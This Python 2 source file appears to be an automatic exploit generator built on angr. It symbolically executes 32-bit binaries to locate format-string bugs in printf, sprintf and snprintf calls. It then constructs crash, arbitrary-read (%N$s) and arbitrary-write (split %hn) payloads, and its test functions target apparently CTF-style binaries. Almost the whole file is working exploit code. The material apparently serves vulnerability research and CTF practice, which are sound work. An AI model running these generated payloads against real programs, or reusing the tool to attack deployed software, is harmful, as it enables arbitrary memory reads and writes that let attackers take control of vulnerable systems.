#!/usr/bin/env python2
#-*-coding:utf-8 -*-
import angr
import commands
import claripy
import struct
import staticScan
import copy
import time
#from pwn import *

class FmtFinder(object):
	def __init__(self,binary,printf_plt=0,hooks=[],read_addr=0,write_addr=0,write_val=0,static_flag=True):
		self.binary=binary
		self.printf_plt=printf_plt
		self.hooks=hooks
		self.read_addr=read_addr
		self.write_addr=write_addr
		self.write_val=write_val
		self.static_flag=static_flag

		self.bug_flag=False #If we have got a fmt bug?
		self.bug_addr=0
		self.fmt_offset=0   #How long to get to %s.
		self.pre_input=''   #To get to bug point.
		self.bug_type=''    #
		self.pre_payload='' #String before %.


		self.crash_payload=''
		self.any_read_payload=''
		self.any_write_payload=''

		self.rodata_min_addr=0
		self.rodata_max_addr=0

	def run(self):
		self._p=angr.Project(self.binary,load_options={"auto_load_libs": False})
		#self._p.hook(0x080483B0,angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) #0x08048350
		if (not self.hooks) and (self.static_flag):
			static_func=staticScan.StaticScan(self.binary,'2333.sig',0x08048000)
			self.hooks=copy.deepcopy(static_func.hooks)

		printf_addr=0
		sprintf_addr=0
		snprintf_addr=0
		#print self.hooks ###############test
		for a in self.hooks:
			if angr.procedures.libc.printf.printf==a[1]:
				print "printf_addr=",hex(a[0])
				printf_addr=a[0]
			if angr.procedures.libc.sprintf.sprintf==a[1]:
				print "sprintf_addr=",hex(a[0])
				sprintf_addr=a[0]
			if angr.procedures.libc.snprintf.snprintf==a[1]:
				print "snprintf_addr=",hex(a[0])
				snprintf_addr=a[0]
			self._p.hook(a[0],a[1])

		if self.static_flag:#(not self.printf_plt) and 
			print "This binary is a static binary!"
			self.printf_plt=printf_addr
			self.sprintf_plt=sprintf_addr
			self.snprintf_plt=snprintf_addr
		else:
			self.printf_plt,self.sprintf_plt,self.snprintf_plt=self.get_printf_plt()

		if not self.printf_plt and not self.sprintf_plt and not self.snprintf_plt:
			return 0

		self.get_rodata_addr()
		start_time = time.time()
		state = self._p.factory.entry_state()
		print 'begin to find...'
		sm = self._p.factory.simgr(state)
		sm = sm.explore(find=self.check)
		if self.bug_flag:
			end_time=time.time()
			t=end_time-start_time
			print '**********Find a bug:',self.bug_type,'  Time=',t,'**********'
		if self.bug_type=='read_write':#self.bug_flag:
			self.attack()
		else:
			print 'Sorry, cannot generate exploit.'
		return 1

	def get_printf_plt(self):
		'''
		In dynamic program, to get printf_plt address.
		'''
		printf_addr=0
		sprintf_addr=0
		snprintf_addr=0
		if 'printf' in self._p.loader.main_object.plt:
			#print hex(self._p.loader.main_object.plt['printf'])
			printf_addr=self._p.loader.main_object.plt['printf']
			print 'printf_addr=',hex(self._p.loader.main_object.plt['printf'])
		if 'sprintf' in self._p.loader.main_object.plt:
			sprintf_addr=self._p.loader.main_object.plt['sprintf']
			print 'sprintf_addr=',hex(self._p.loader.main_object.plt['sprintf'])
		if 'snprintf' in self._p.loader.main_object.plt:
			snprintf_addr=self._p.loader.main_object.plt['snprintf']
			print 'snprintf_addr=',hex(self._p.loader.main_object.plt['snprintf'])
		return printf_addr,sprintf_addr,snprintf_addr

	def get_rodata_addr(self):
		'''
		Format string sometimes is in .rodata! 
		We can get .rodata address.
		'''
		if '.rodata' in self._p.loader.main_object.sections_map:
			self.rodata_min_addr=self._p.loader.main_object.sections_map['.rodata'].min_addr
			self.rodata_max_addr=self._p.loader.main_object.sections_map['.rodata'].max_addr
		print 'rodata_addr:',hex(self.rodata_min_addr),'->',hex(self.rodata_max_addr)
		return 0

	def get_prestring(self,str1):
		'''
		To get concrete string, not symbolic!
		'''
		ret=''
		for i in range(len(str1)):
			if ord(str1[i])==0:
				ret+=str1[:i]
				break
		return ret

	def check(self,state):
		'''
		To judge whether we have got a Fmt crash.
		If fmt string is out of program address, it may be a fmt bug.
		'''
		#print 'Address:',hex(state.se.eval(state.regs.eip))
		if state.se.eval(state.regs.eip)==self.printf_plt:
			fmt_address=state.se.eval(state.regs.esp+4,cast_to=int)
			argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
			print "Fmt pointer address:",hex(fmt_address)
			print 'Find one printf!!!!!!  First argument is:',hex(argu1)
			if argu1<state.project.loader.main_object.min_addr or argu1>state.project.loader.main_object.max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				fmt_offset=argu1-fmt_address
				if fmt_offset>=0 and fmt_offset<0x2000:
					self.fmt_offset=fmt_offset
					self.bug_type='read_write'
				else:
					self.fmt_offset=None
					self.bug_type='read'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
			if argu1<self.rodata_min_addr or argu1>self.rodata_max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				self.fmt_offset=argu1-fmt_address
				self.bug_type='write'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
		elif state.se.eval(state.regs.eip)==self.sprintf_plt:
			fmt_address=state.se.eval(state.regs.esp+8,cast_to=int)
			argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
			print "Fmt pointer address:",hex(fmt_address)
			print 'Find one sprintf!!!!!!  Second argument is:',hex(argu1)
			if argu1<state.project.loader.main_object.min_addr or argu1>state.project.loader.main_object.max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				fmt_offset=argu1-fmt_address
				if fmt_offset>=0 and fmt_offset<0x2000:
					self.fmt_offset=fmt_offset
					self.bug_type='read_write'
				else:
					self.fmt_offset=None
					self.bug_type='read'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
			if argu1<self.rodata_min_addr or argu1>self.rodata_max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				self.fmt_offset=argu1-fmt_address
				self.bug_type='write'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
		elif state.se.eval(state.regs.eip)==self.snprintf_plt:
			fmt_address=state.se.eval(state.regs.esp+12,cast_to=int)
			argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+12,4),cast_to=str))
			print "Fmt pointer address:",hex(fmt_address)
			print 'Find one sprintf!!!!!!  Second argument is:',hex(argu1)
			if argu1<state.project.loader.main_object.min_addr or argu1>state.project.loader.main_object.max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				fmt_offset=argu1-fmt_address
				if fmt_offset>=0 and fmt_offset<0x2000:
					self.fmt_offset=fmt_offset
					self.bug_type='read_write'
				else:
					self.fmt_offset=None
					self.bug_type='read'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
			if argu1<self.rodata_min_addr or argu1>self.rodata_max_addr:
				self.bug_flag=True
				self.bug_addr=hex(state.se.eval(state.regs.eip))
				self.fmt_offset=argu1-fmt_address
				self.bug_type='write'
				self.pre_input=self.get_prestring(state.posix.dumps(0))
				self.pre_payload=state.se.eval(state.memory.load(argu1,200),cast_to=str)
				self.pre_payload=self.get_prestring(self.pre_payload)
				self.pre_input=self.pre_input[:(len(self.pre_input)-len(self.pre_payload))]
				print 'Find a fmt bug!!!!!'
				return True
		return False

	def crash(self):
		'''
		To construct crash data.
		'''
		payload=''
		payload=self.pre_payload+'[Result]:'
		len_p=len(payload)   #len_p / 4 +3(padding)+1(addr)
		len_padding=(len_p/4+3)*4
		off_addr=(len_p+self.fmt_offset)/4+3
		#off_addr=int(off_addr,10)
		payload+='%'
		payload+=str(off_addr)
		payload+='$s'
		payload=payload.ljust(len_padding,'A')
		payload+='\x01\x01\x01\x01'
		self.crash_payload=self.pre_input+payload
		#print "crash payload=",repr(payload)
		return 0

	def any_read(self):
		'''
		To read data from any given address.
		'''
		payload=''
		payload=self.pre_payload+'[Result]:'
		len_p=len(payload)   #len_p / 4 +3(padding)+1(addr)
		len_padding=(len_p/4+3)*4
		off_addr=(len_p+self.fmt_offset)/4+3
		#off_addr=int(off_addr,10)
		payload+='%'
		payload+=str(off_addr)
		payload+='$s'
		payload=payload.ljust(len_padding,'A')
		payload+=struct.pack("I",self.read_addr)    
		self.any_read_payload=self.pre_input+payload
		#print "any_read payload=",repr(payload)
		return 0

	def any_write(self):
		'''
		To write any data at any address.
		'''
		high=self.write_val>>16
		low=self.write_val & 0xffff
		payload=''
		payload=self.pre_payload
		len_p=len(payload)
		len_padding=(len_p/4+8)*4
		off_addr=(len_p+self.fmt_offset)/4+8
		if high<low:
			high_p=high-len_p
			low_p=(self.write_val-len_p-high_p) & 0xffff
			payload+='%'
			payload+=str(high_p)
			payload+='c%'
			payload+=str(off_addr)
			payload+='$hn'
			payload+='%'
			payload+=str(low_p)
			payload+='c%'
			payload+=str(off_addr+1)
			payload+='$hn'
			payload=payload.ljust(len_padding,'A')
			payload+=struct.pack("I",self.write_addr+2)          
			payload+=struct.pack("I",self.write_addr)
			#print "write_addr:",hex(self.write_addr)
			#print repr(struct.pack("I",self.write_addr))
		else:
			low_p=low-len_p
			high_p=high-len_p-low_p
			payload+='%'
			payload+=str(low_p)
			payload+='c%'
			payload+=str(off_addr)
			payload+='$hn'
			payload+='%'
			payload+=str(high_p)
			payload+='c%'
			payload+=str(off_addr+1)
			payload+='$hn'
			payload=payload.ljust(len_padding,'A')
			payload+=struct.pack("I",self.write_addr)          
			payload+=struct.pack("I",self.write_addr+2)
		self.any_write_payload=self.pre_input+payload
		#print "any_write payload=",repr(payload)
		return 0

	def attack(self):
		'''
		Start to construct exploit data.
		'''
		self.crash()
		if self.bug_type=='read_write' and self.read_addr:
			self.any_read()
		if self.write_addr and self.write_val:
			self.any_write()
		return 0

	def result_display(self):
		'''
		Pretty print the result.
		'''
		if self.bug_flag:
			print "------------***   Let's pretty print the results  ***------------"
			print 'The crash type is : ',self.bug_type
			print 'The fmt_offset is : ',self.fmt_offset
			print len(self.pre_input)
			print 'The crash pre_input is : ',self.pre_input
			print 'The crash pre_payload is : ',self.pre_payload
			print "crash payload=",repr(self.crash_payload)
			print "any_read payload=",repr(self.any_read_payload)
			print "any_write payload=",repr(self.any_write_payload)

def test1(binary):
	'''
	Binary has pre input.
	'''
	aa=FmtFinder(binary=binary,printf_plt=0,hooks=[],read_addr=0x080486D3,write_addr=0x0804A060,write_val=0x49496565,static_flag=True)#0x080483C0
	aa.run()
	aa.result_display()
def test2(binary):
	'''
	Binary has no pre input.
	'''
	aa=FmtFinder(binary=binary,printf_plt=0,hooks=[],read_addr=0x0804A040,write_addr=0x0804A048,write_val=0x49496565,static_flag=False)#0x080483C0
	aa.run()
	aa.result_display()
def test3(binary):
	'''
	Static binary
	'''
	hooks=[]
	printf=(0x080483C0,angr.SIM_PROCEDURES['libc']['printf'])
	hooks.append(printf)
	aa=FmtFinder(binary=binary,printf_plt=0,hooks=hooks,read_addr=0x080486D3,write_addr=0x0804A060,write_val=0x49496565,static_flag=True)#0x080483C0
	aa.run()
	aa.result_display()


if __name__ == '__main__':
    test1('/usr/downloads/test/testcase/robo_change/work/binary/_89_pwn09')
    #test2('./fmt2_test')
    #test3('./fmt_pre_test')
